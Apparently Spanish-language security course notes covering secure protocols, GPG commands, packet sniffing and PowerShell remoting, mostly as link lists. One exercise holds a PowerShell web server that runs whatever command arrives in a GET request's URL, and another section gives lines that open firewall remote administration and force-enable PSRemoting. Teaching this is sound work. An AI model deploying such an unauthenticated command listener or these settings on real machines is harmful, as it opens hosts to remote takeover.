     - SSL/TSL: capa 4.
     - PGP.
         * https://www.incibe-cert.es/sites/default/files/contenidos/guias/doc/incibe_cert_guia_para_el_uso_de_pgp_en_clientes_de_correo_electronico.pdf
     - S/MIME.
   - Seguridad en los protocolos para comunicaciones inalámbricas.
   - Monitorización del tráfico en redes.
     * https://www.jesusninoc.com/network/
     * https://www.jesusninoc.com/wireshark/
     * https://www.jesusninoc.com/07/09/9-gestion-de-la-red-en-powershell/
   - Intentos de penetración. Intrusiones externas vs. Intrusiones internas. Seguridad perimetral.
 
----------------------

# Ejercicios

## Ejecutar un comando remotamente mediante una petición GET

### Servidor desde PowerShell
* https://www.jesusninoc.com/2017/05/06/crear-un-servidor-web-al-que-se-pueda-acceder-desde-cualquier-parte-de-la-red-privada-con-powershell/

### Ejecutar un comando remotamente utilizando un servidor web creado en PowerShell
```Powershell
$routes = @{
    "/" = { return '<html><body>Servidor web funcionando</body></html>' }
}

#Importante poner la IP de la red privada
$url = 'http://192.168.204.222:8027/'
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add($url)
$listener.Start()

Write-Host "Funcionando $url..."

while ($listener.IsListening)
{
    $context = $listener.GetContext()
    $requestUrl = $context.Request.Url
    $response = $context.Response

    Write-Host ''
    Write-Host "Petición: $requestUrl"

    $localPath = $requestUrl.LocalPath
    $route = $routes.Get_Item($requestUrl.LocalPath)

    if ($route -eq $null)
    {
        $response.StatusCode = 404
    }
    else
    {
        
        $content = & $route
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($content)
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
    }
    
    $response.Close()
    start-process ($context.Request.RawUrl -replace "/")
    $context.Request.RawUrl
    $responseStatus = $response.StatusCode
    Write-Host "Respuesta: $responseStatus"
}
```

## Analizar direcciones MAC
* https://github.com/MaxAnderson95/MAC-Address-Lookup-Tool

------------------

# Modificar paquetes

## Modificar la dirección IP de origen en mensajes UDP con SoftPerfect Network Protocol Analyzer
https://www.jesusninoc.com/2016/04/02/modificar-la-direccion-ip-de-origen-en-mensajes-udp-con-softperfect-network-protocol-analyzer/

## Modificar datagramas UDP con SoftPerfect Network Protocol Analyzer
https://www.jesusninoc.com/2016/03/19/modificar-datagramas-udp-con-softperfect-network-protocol-analyzer/

## Polymorph: Modificando paquetes de red en tiempo real. Inyectando JavaScript en peticiones HTTP
http://www.elladodelmal.com/2018/04/polymorph-modificando-paquetes-de-red.html
http://www.elladodelmal.com/2018/04/polymorph-modificando-paquetes-de-red_30.html
http://www.elladodelmal.com/2018/05/polymorph-modificando-paquetes-de-red.html

--------------------
--------------------

# Implantación de mecanismos de seguridad activa
- Seguridad en la red corporativa:
  - Descripción general de protocolos seguros a diferentes niveles: IPsec (Internet Protocol Security), SSL/TSL (Secure Sockets Layer/Transport Layer Security), PGP (Pretty Good Privacy), S/MIME (Secure / Multipurpose Internet Mail Extensions)...
     - IPsec: capa 3. VPN.
     - SSL/TSL: capa 4.
     - PGP.
         * https://www.incibe-cert.es/sites/default/files/contenidos/guias/doc/incibe_cert_guia_para_el_uso_de_pgp_en_clientes_de_correo_electronico.pdf
     - S/MIME.
   - Seguridad en los protocolos para comunicaciones inalámbricas.

----------------------

# Use PGP Command Line to Create and Manage PGP Keys
* https://www.maketecheasier.com/pgp-encryption-how-it-works/
* https://www.networkworld.com/article/3293052/encypting-your-files-with-gpg.html

## Ejemplo de comandos PGP
```CMD
pgp --gen-key "Joe User" --key-type RSA --bits 2048 --passphrase "my passphrase"
pgp --list-keys
pgp --list-keys
pgp --export 0x12345678
pgp --export "Joe User"
pgp --import "Joe User.asc"
```

## Ejemplo cifrar y descifrar un fichero con GPG
```Bash
gpg --gen-key
gpg --list-keys
echo "hola amigos" > ficheronosecreto
gpg --encrypt --recipient myfriend@gmail.com fichernosecreto
gpg --decrypt --recipient andel ficheronosecreto.gpg
```

# EXPORTS A CERTIFICATE TO A PERSONAL INFORMATION EXCHANGE (PFX) FILE
* https://www.jesusninoc.com/11/18/exports-a-certificate-to-a-personal-information-exchange-pfx-file/

--------------------
--------------------

# Implantación de mecanismos de seguridad activa
- Seguridad en la red corporativa:
   - Seguridad en los protocolos para comunicaciones inalámbricas.
   - Monitorización del tráfico en redes.
     * https://www.jesusninoc.com/network/
     * https://www.jesusninoc.com/wireshark/
     * https://www.jesusninoc.com/07/09/9-gestion-de-la-red-en-powershell/
   - Intentos de penetración. Intrusiones externas vs. Intrusiones internas. Seguridad perimetral.
- Herramientas de seguridad y monitorización
  - Herramientas preventivas y paliativas (descifrar contraseñas, anti-rootkit, sniffers, escaneadores de puertos, detectores de vulnerabilidades, sistemas de detección de intrusos, recuperación de datos…)
    * https://sectools.org/
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-02-26.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-10-25.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-10-29.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-10-30.md
    * https://teamghsoftware.wordpress.com/maltrail-herramienta-para-monitorizacion-de-red-y-deteccion-de-amenazas/
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-12-03.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-12-04.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-12-05.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019-01-21.md
    * https://www.jesusninoc.com/05/01/usbpcap-usb-packet-capture-for-windows/
    * https://hacking-etico.com/2016/03/10/analisis-usb-wireshark-parte-2
  - Instalación y configuración básica.

--------------------

# Sniffers

## Proyecto: analizar información de los distintos protocolos de la red (DNS, LLMNR, DHCP, HTTP, FTP, SMTP, CUPS)
* https://github.com/jesusninoc/ClasesASO/blob/master/2019-10-07.md#proyecto-analizar-informaci%C3%B3n-de-los-distintos-protocolos-de-la-red-dns-llmnr-dhcp-http-ftp-smtp-cups

## ¿Qué podemos analizar en la red con Wireshark?
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-02-21.md

## Análisis de conexiones de red
* https://www.jesusninoc.com/05/01/analisis-de-conexiones-de-red/

## Tcpdump
* http://www.thegeekstuff.com/2010/08/tcpdump-command-examples

## Wireshark
* https://www.jesusninoc.com/wireshark/

## Practical Packet Analysis, 3rd Edition
* https://nostarch.com/packetanalysis3

## ANÁLISIS DE TRÁFICO CON WIRESHARK
* https://www.incibe.es/extfrontinteco/img/File/intecocert/EstudiosInformes/cert_inf_seguridad_analisis_trafico_wireshark.pdf

## Wireshark User’s Guide
* https://www.wireshark.org/docs/wsug_html_chunked/

## Download the capture files for this book (.zip)
* https://nostarch.com/packetanalysis3

## Capturar tráfico con tshark
* https://www.jesusninoc.com/04/24/capturar-trafico-con-tshark/

--------------------

# Ejercicio: conectarse a un Routerboard de MicroTik, establecer una dirección IP en el dispositivo y capturar tráfico con la herramienta Packet Sniffer
## Ayuda
### Manual:First time startup
* https://wiki.mikrotik.com/wiki/Manual:First_time_startup
### Manual:IP/Address
* https://wiki.mikrotik.com/wiki/Manual:IP/Address
### Do not use console numbers to get parameter values
* https://wiki.mikrotik.com/wiki/Manual:Scripting_Tips_and_Tricks#Do_not_use_console_numbers_to_get_parameter_values
### Manual:Tools/Packet Sniffer
* https://wiki.mikrotik.com/wiki/Manual:Tools/Packet_Sniffer

----------------------

# Packet generator
A packet generator or packet builder is a type of software that generates random packets or allows the user to construct detailed custom packets. Depending on the network medium and operating system, packet generators utilize raw sockets, NDIS function calls, or direct access to the network adapter kernel-mode driver.

|Title|Author|OS|Interface|License|
|---|---|---|---|---|
AnetTest|Anton aka kronos256|Windows, Unix|CLI|GPL
Bit-Twist|Addy Yeow Chin Heng|Windows, Linux, BSD, Mac OS X|CLI|GPLv2
Cat Karat packet builder|Valery Diomin, Yakov Tetruashvili|Windows|GUI|Packet Builder License
Colasoft Packet Builder|Colasoft|Windows|GUI|Packet Builder License: Freeware
CommView Packet Generator |TamoSoft|Windows|GUI|Proprietary EULA
IP Sorcery|Josiah Zayner|Unix|CLI and GUI|GPL
Nemesis|Jeff Nathan|Windows, Unix|CLI|BSD
Ostinato|Srivats P|Windows, Linux, BSD, Mac OS X|GUI and API|GPLv3
Packet Construction Set|George Neville-Neil|Linux, BSD, Mac OS X|CLI|BSD-like
Packet Sender|Dan Nagle|Windows, Linux, Mac OS X|CLI and GUI|GPLv2
Pktgen|Linux Foundation|Linux|CLI|GPLv2
packETH|Miha Jemec aka jemcek|Linux, Windows|GUI|GPLv2
pierf|Pieter Blommaert|Windows(Cygwin)/Linux|CLI|free BSD
rain|Michael Behan|Linux, BSD|CLI|free GPLv2
Scapy|Philippe BIONDI|Linux/Unix/Windows|CLI|GPLv2
targa3|Mixter|Linux, Unix|CLI|?
UMPA|Adriano Monteiro Marques|Cross-platform (Python)|?|GPLv2
trafgen|Daniel Borkmann|Linux|CLI|GPLv2
xcap|cxxxap|Windows|GUI|Free
Simple Packet Sender (SPS)|h0h1r4um|Linux|GUI|GPLv3
WARP17|Juniper Networks|Linux|CLI and API|BSD
Wirefloss|Wirefloss|Web page|GUI|Free

## Packet Sender
Packet Sender can send and receive UDP, TCP, and SSL on the ports of your choosing. 
All servers and clients may run simultaneously. https://packetsender.com/download

------------------

# Scapy

## Network packet manipulation with Scapy
http://www.secdev.org/conf/scapy_Aachen.pdf

## Construyendo un paquete UDP con Scapy
https://dan1t0.wordpress.com/2011/02/07/scapy-udp/

## How to Build a TCP Connection in Scapy
https://www.fir3net.com/Programming/Python/how-to-build-a-tcp-connection-in-scapy.html

## Scapy: Finding All Wi-Fi Devices
https://www.youtube.com/watch?v=tJuuh5CSP5c

## Raw Packet Manipulation with Scapy
https://www.endpoint.com/blog/2015/04/29/raw-packet-manipulation-with-scapy

------------------

# TCP INJECTION ATTACKS IN THE WILD
* https://www.blackhat.com/docs/us-16/materials/us-16-Nakibly-TCP-Injection-Attacks-in-the-Wild-A-Large-Scale-Study.pdf
* https://www.youtube.com/watch?v=b4oB1FB_vrM
* http://www.cs.technion.ac.il/~gnakibly/TCPInjections/samples.zip

------------------

# Más sobre captura de paquetes

## Packet capture on Windows without a kernel driver
https://github.com/nospaceships/raw-socket-sniffer

## Relación entre puertos UDP y procesos (construir un objeto con propiedades personalizadas)
https://www.jesusninoc.com/2018/05/02/relacion-entre-puertos-udp-y-procesos-construir-un-objeto-con-propiedades-personalizadas/

## Relación entre puertos TCP y procesos (construir un objeto con propiedades personalizadas)
https://www.jesusninoc.com/2018/05/03/relacion-entre-puertos-tcp-y-procesos-construir-un-objeto-con-propiedades-personalizadas/

## Conectarse a una carpeta compartida con PowerShell
https://www.jesusninoc.com/2017/06/14/conectarse-a-una-carpeta-compartida-con-powershell/

## Instalar remotamente un paquete MSI
https://www.jesusninoc.com/2017/05/27/instalar-remotamente-un-paquete-msi/

--------------------
--------------------

# Implantación de mecanismos de seguridad activa
- Seguridad en la red corporativa:
  - Problemas de seguridad y vulnerabilidades en protocolos TCP/IP.
  - Riesgos potenciales de los servicios de red.
  - Ataques en redes TCP/IP (suplantación, denegación de servicio…).
  - Seguridad en los accesos de red. Arranque de servicios. Puertos.
  - Descripción general de protocolos seguros a diferentes niveles: IPsec (Internet Protocol Security), SSL/TSL (Secure Sockets Layer/Transport Layer Security), PGP (Pretty Good Privacy), S/MIME (Secure / Multipurpose Internet Mail Extensions)...
  - Seguridad en los protocolos para comunicaciones inalámbricas.
  - Monitorización del tráfico en redes.
  - Intentos de penetración. Intrusiones externas vs. Intrusiones internas. Seguridad perimetral.

## Remoting PowerShell

### Enabling Remoting
There are many ways how cmdlets can get remote information from another computer. Here are just a few:

```PowerShell
# try and connect to this computer
# (adjust it to a valid name in your network) 
$destinationServer = "SERVER12"
 
# PowerShell remoting 
$result1 = Invoke-Command { Get-Service } -ComputerName $destinationServer
 
# built-in 
$result2 = Get-Service -ComputerName $destinationServer
$result3 = Get-Process -ComputerName $destinationServer
```

If you’d like to open up the most commonly used remoting techniques on a test machine, run these lines from a PowerShell with elevated privileges:

```PowerShell
netsh firewall set service remoteadmin enable 
Enable-PSRemoting -SkipNetworkProfileCheck -Force
```
### Lateral Movement Using WinRM and WMI
https://redcanary.com/blog/lateral-movement-winrm-wmi/

### NO WIN32_PROCESS NEEDED – EXPANDING THE WMI LATERAL MOVEMENT ARSENAL
https://www.cybereason.com/blog/wmi-lateral-movement-win32

### Get-WmiObject
http://community.idera.com/powershell/powertips/b/tips/posts/wmi-quick-primer-part-2

Here are two example calls that both retrieve information about file shares from a remote system (make sure you adjust the computer name):
```PowerShell
Get-WmiObject -Class Win32_Share -ComputerName sr0710 
Get-CimInstance -ClassName Win32_Share -ComputerName sr0710
```

### Get-CimInstance
While Get-WmiObject always uses DCOM as a transport protocol, Get-CimInstance uses WSMan (a webservice-type of communication). Most modern Windows systems support WSMan, but if you need to contact older servers, they may only respond to DCOM, thus Get-CimInstance may fail.

Get-CimInstance can use session options, however, that provide great flexibility, and allow you to choose the transport protocol. In order to use DCOM (just like Get-WmiObject), do the following:

```PowerShell
$options = New-CimSessionOption -Protocol Dcom 
$session = New-CimSession -ComputerName sr0710 -SessionOption $options
$sh = Get-CimInstance -ClassName Win32_Share -CimSession $session 
Remove-CimSession -CimSession $session
```

Here is an example illustrating how the same session is used for two queries:
http://community.idera.com/powershell/powertips/b/tips/posts/wmi-quick-primer-part-3
```PowerShell
# create the session 
$options = New-CimSessionOption -Protocol Wsman 
$session = New-CimSession -ComputerName sr0710 -SessionOption $options
 
# reuse the session for as many queries as you like 
$sh = Get-CimInstance -ClassName Win32_Share -CimSession $session -Filter 'Name="Admin$"' 
$se = Get-CimInstance -ClassName Win32_Service -CimSession $session
 
# remove the session at the end 
Remove-CimSession -CimSession $session
```

------------------

## Pentesters

### PowerShell for Pentesters
* http://www.securitytube-training.com/online-courses/powershell-for-pentesters/index.html
* https://github.com/salu90/PSFPT

### Empire
* https://github.com/EmpireProject/Empire
* https://unicornriot.ninja/2019/massive-hack-strikes-offshore-cayman-national-bank-and-trust/#4.2

### AutoRDPwn – La guía definitiva
* https://darkbyte.net/autordpwn-la-guia-definitiva/

### Powercat
* https://github.com/besimorhino/powercat

### Posh-SecMod
* https://github.com/darkoperator/Posh-SecMod

### PowerSploit
* https://github.com/PowerShellMafia/PowerSploit/

### Nishang
* https://github.com/samratashok/nishang
